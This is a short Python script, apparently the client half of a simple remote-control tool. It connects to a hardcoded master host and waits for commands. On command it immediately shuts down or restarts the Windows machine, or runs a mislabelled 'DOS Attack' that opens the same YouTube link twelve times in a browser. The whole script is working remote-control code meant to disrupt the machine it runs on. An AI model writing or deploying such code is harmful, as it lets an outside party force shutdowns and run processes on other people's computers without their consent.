import time
import sys
import socket
import os

s=socket.socket()
host = "10.250.0.34"  #Enter the address of the machine which you are running master scriptt.
port = 8080
s.connect((host,port))
print ("")
print("Connected to server")

command = s.recv(1024)
command = command.decode()
if command == "shutdown":
    print ("")
    print ("Shutdown command")
    s.send("command received".encode())
    os.system("shutdown.exe /s /t 00")
    
elif command == "restart":
    print ("")
    print ("Restart command")
    s.send("command received".encode())
    os.system("shutdown.exe /r /t 00")

elif command =="DOS Attack":
  print ("")
  print ("DOS command")
  s.send("command received".encode())
  os.system("start brave.exe https://youtu.be/dQw4w9WgXcQ")
  os.system("start brave.exe https://youtu.be/dQw4w9WgXcQ")
  os.system("start brave.exe https://youtu.be/dQw4w9WgXcQ")
  os.system("start brave.exe https://youtu.be/dQw4w9WgXcQ")
  os.system("start brave.exe https://youtu.be/dQw4w9WgXcQ")
  os.system("start brave.exe https://youtu.be/dQw4w9WgXcQ")
  os.system("start brave.exe https://youtu.be/dQw4w9WgXcQ")
  os.system("start brave.exe https://youtu.be/dQw4w9WgXcQ")
  os.system("start brave.exe https://youtu.be/dQw4w9WgXcQ")
  os.system("start brave.exe https://youtu.be/dQw4w9WgXcQ")
  os.system("start brave.exe https://youtu.be/dQw4w9WgXcQ")
  os.system("start brave.exe https://youtu.be/dQw4w9WgXcQ")
